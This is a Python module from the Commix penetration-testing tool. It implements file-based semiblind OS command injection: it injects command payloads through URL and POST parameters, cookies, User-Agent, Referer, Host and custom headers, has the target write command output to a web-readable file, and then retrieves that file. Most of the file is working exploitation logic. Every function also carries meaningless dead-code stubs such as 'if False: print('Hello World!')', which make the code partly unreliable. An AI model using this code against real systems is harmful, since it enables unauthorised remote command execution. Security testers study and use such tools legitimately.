"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import re
import os
import sys
import time
import json
import string
import random
import base64
from src.utils import menu
from src.utils import settings
from src.core.requests import tor
from src.core.requests import proxy
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.utils import common
from src.core.injections.controller import checks
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import input as _input
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_payloads
'\nThe "file-based" technique on semiblind OS command injection.\n'
'\nCheck if target host is vulnerable.\n'

def injection_test(payload, http_request_method, url):
    if False:
        return 10
    if not settings.USER_DEFINED_POST_DATA:
        payload = payload.replace(settings.SINGLE_WHITESPACE, '%20')
        vuln_parameter = parameters.vuln_GET_param(url)
        target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(target)
        headers.do_check(request)
        try:
            response = requests.get_request_response(request)
        except KeyboardInterrupt:
            response = None
    else:
        parameter = menu.options.data
        parameter = parameters.do_POST_check(parameter, http_request_method)
        parameter = ''.join((str(e) for e in parameter)).replace('+', '%2B')
        if settings.IS_JSON:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace('"', '\\"')))
            try:
                data = checks.json_data(data)
            except ValueError:
                pass
        elif settings.IS_XML:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
        else:
            data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
        request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
        headers.do_check(request)
        vuln_parameter = parameters.vuln_POST_param(parameter, url)
        try:
            response = requests.get_request_response(request)
        except KeyboardInterrupt:
            response = None
    return (response, vuln_parameter)
'\nCheck if target host is vulnerable. (Cookie-based injection)\n'

def cookie_injection_test(url, vuln_parameter, payload):
    if False:
        print('Hello World!')
    return requests.cookie_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (User-Agent-based injection)\n'

def user_agent_injection_test(url, vuln_parameter, payload):
    if False:
        while True:
            i = 10
    return requests.user_agent_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Referer-based injection)\n'

def referer_injection_test(url, vuln_parameter, payload):
    if False:
        return 10
    return requests.referer_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Host-based injection)\n'

def host_injection_test(url, vuln_parameter, payload):
    if False:
        i = 10
        return i + 15
    return requests.host_injection(url, vuln_parameter, payload)
'\nCheck if target host is vulnerable. (Custom header injection)\n'

def custom_header_injection_test(url, vuln_parameter, payload):
    if False:
        i = 10
        return i + 15
    return requests.custom_header_injection(url, vuln_parameter, payload)
'\nThe main command injection exploitation.\n'

def injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        for i in range(10):
            print('nop')

    def check_injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
        if False:
            for i in range(10):
                print('nop')
        if alter_shell:
            payload = fb_payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE)
        else:
            payload = fb_payloads.cmd_execution(separator, cmd, OUTPUT_TEXTFILE)
        payload = parameters.prefixes(payload, prefix)
        payload = parameters.suffixes(payload, suffix)
        payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
        payload = checks.perform_payload_modification(payload)
        if settings.VERBOSITY_LEVEL != 0:
            payload_msg = payload.replace('\n', '\\n')
            if settings.COMMENT in payload_msg:
                payload = payload.split(settings.COMMENT)[0].strip()
                payload_msg = payload_msg.split(settings.COMMENT)[0].strip()
            debug_msg = "Executing the '" + cmd.split(settings.COMMENT)[0].strip() + "' command. "
            sys.stdout.write(settings.print_debug_msg(debug_msg))
            sys.stdout.flush()
            output_payload = '\n' + settings.print_payload(payload)
            if settings.VERBOSITY_LEVEL != 0:
                output_payload = output_payload + '\n'
            sys.stdout.write(output_payload)
        if menu.options.cookie and settings.INJECT_TAG in menu.options.cookie:
            response = cookie_injection_test(url, vuln_parameter, payload)
        elif menu.options.agent and settings.INJECT_TAG in menu.options.agent:
            response = user_agent_injection_test(url, vuln_parameter, payload)
        elif menu.options.referer and settings.INJECT_TAG in menu.options.referer:
            response = referer_injection_test(url, vuln_parameter, payload)
        elif menu.options.host and settings.INJECT_TAG in menu.options.host:
            response = host_injection_test(url, vuln_parameter, payload)
        elif settings.CUSTOM_HEADER_INJECTION:
            response = custom_header_injection_test(url, vuln_parameter, payload)
        elif not settings.USER_DEFINED_POST_DATA:
            payload = payload.replace(settings.SINGLE_WHITESPACE, '%20')
            target = url.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
            vuln_parameter = ''.join(vuln_parameter)
            request = _urllib.request.Request(target)
            headers.do_check(request)
            response = requests.get_request_response(request)
        else:
            parameter = menu.options.data
            parameter = parameters.do_POST_check(parameter, http_request_method)
            parameter = ''.join((str(e) for e in parameter)).replace('+', '%2B')
            vuln_parameter = parameters.vuln_POST_param(parameter, url)
            if settings.IS_JSON:
                data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload.replace('"', '\\"')))
                try:
                    data = checks.json_data(data)
                except ValueError:
                    pass
            elif settings.IS_XML:
                data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, _urllib.parse.unquote(payload))
            else:
                data = parameter.replace(settings.TESTABLE_VALUE + settings.INJECT_TAG, settings.INJECT_TAG).replace(settings.INJECT_TAG, payload)
            request = _urllib.request.Request(url, data.encode(settings.DEFAULT_CODEC))
            headers.do_check(request)
            response = requests.get_request_response(request)
        return response
    response = check_injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
    return response
'\nFind the URL directory.\n'

def injection_output(url, OUTPUT_TEXTFILE, timesec):
    if False:
        for i in range(10):
            print('nop')

    def custom_web_root(url, OUTPUT_TEXTFILE):
        if False:
            return 10
        path = _urllib.parse.urlparse(url).path
        if path.endswith('/'):
            scheme = _urllib.parse.urlparse(url).scheme
            netloc = _urllib.parse.urlparse(url).netloc
            output = scheme + '://' + netloc + path + OUTPUT_TEXTFILE
        else:
            try:
                path_parts = [non_empty for non_empty in path.split('/') if non_empty]
                count = 0
                for part in path_parts:
                    count = count + 1
                count = count - 1
                last_param = path_parts[count]
                output = url.replace(last_param, OUTPUT_TEXTFILE)
                if '?' and '.txt' in output:
                    try:
                        output = output.split('?')[0]
                    except:
                        pass
            except IndexError:
                output = url + '/' + OUTPUT_TEXTFILE
        settings.DEFINED_WEBROOT = output
        return output
    if not settings.DEFINED_WEBROOT or settings.MULTI_TARGETS:
        if menu.options.web_root:
            _ = '/'
            if not menu.options.web_root.endswith(_):
                menu.options.web_root = menu.options.web_root + _
            scheme = _urllib.parse.urlparse(url).scheme
            netloc = _urllib.parse.urlparse(url).netloc
            output = scheme + '://' + netloc + _ + OUTPUT_TEXTFILE
            for item in settings.LINUX_DEFAULT_DOC_ROOTS:
                if item == menu.options.web_root:
                    settings.DEFINED_WEBROOT = output
                    break
            if not settings.DEFINED_WEBROOT or (settings.MULTI_TARGETS and (not settings.RECHECK_FILE_FOR_EXTRACTION)):
                if settings.MULTI_TARGETS:
                    settings.RECHECK_FILE_FOR_EXTRACTION = True
                while True:
                    message = "Do you want to use URL '" + output
                    message += "' for command execution output? [Y/n] > "
                    procced_option = common.read_input(message, default='Y', check_batch=True)
                    if procced_option in settings.CHOICE_YES:
                        settings.DEFINED_WEBROOT = output
                        break
                    elif procced_option in settings.CHOICE_NO:
                        message = 'Please enter URL to use '
                        message += 'for command execution output: > '
                        message = common.read_input(message, default=output, check_batch=True)
                        output = settings.DEFINED_WEBROOT = message
                        info_msg = "Using '" + output
                        info_msg += "' for command execution output."
                        print(settings.print_info_msg(info_msg))
                        if not settings.DEFINED_WEBROOT:
                            pass
                        else:
                            break
                    elif procced_option in settings.CHOICE_QUIT:
                        raise SystemExit()
                    else:
                        common.invalid_option(procced_option)
                        pass
        else:
            output = custom_web_root(url, OUTPUT_TEXTFILE)
    else:
        output = settings.DEFINED_WEBROOT
    if settings.VERBOSITY_LEVEL != 0:
        debug_msg = "Checking URL '" + output + "' for command execution output."
        print(settings.print_debug_msg(debug_msg))
    return output
'\nCommand execution results.\n'

def injection_results(url, OUTPUT_TEXTFILE, timesec):
    if False:
        i = 10
        return i + 15
    output = injection_output(url, OUTPUT_TEXTFILE, timesec)
    request = _urllib.request.Request(output)
    headers.do_check(request)
    if menu.options.proxy or menu.options.ignore_proxy:
        response = proxy.use_proxy(request)
    elif menu.options.tor:
        response = tor.use_tor(request)
    else:
        response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
    try:
        shell = checks.page_encoding(response, action='encode').rstrip().lstrip()
        if settings.TARGET_OS == settings.OS.WINDOWS:
            shell = [newline.replace('\r', '') for newline in shell]
            shell = [empty for empty in shell if empty]
    except _urllib.error.HTTPError as e:
        if str(e.getcode()) == settings.NOT_FOUND_ERROR:
            shell = ''
    return shell